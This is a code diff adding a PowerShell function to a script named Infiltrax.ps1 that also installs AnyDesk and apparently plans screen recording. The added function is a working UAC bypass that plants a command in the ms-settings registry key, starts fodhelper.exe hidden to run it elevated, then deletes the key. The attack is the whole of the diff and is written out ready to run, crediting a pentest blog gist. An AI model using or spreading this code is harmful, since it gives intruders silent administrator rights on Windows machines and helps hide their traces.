@@ -279,6 +279,36 @@ function Invoke-AnyDeskInstall {
     Check-AnyDeskInstallation
 }
 
+function Invoke-FodHelperBypass {
+
+<#
+.SYPNOSIS
+
+    Bypasses UAC via fodhelper.exe to run powershell process in elevated session.
+    This script is taken from https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 who is the original author.
+
+.NOTES
+   
+    File Name  : Infiltrax.ps1 
+    Original function Author     : netbiosX. - pentestlab.blog 
+
+#>
+
+ Param (
+           
+        [String]$program = "cmd /c start powershell.exe" 
+       )
+
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+
+}
 # To do: adding screen recording functionality probably? 
 
 
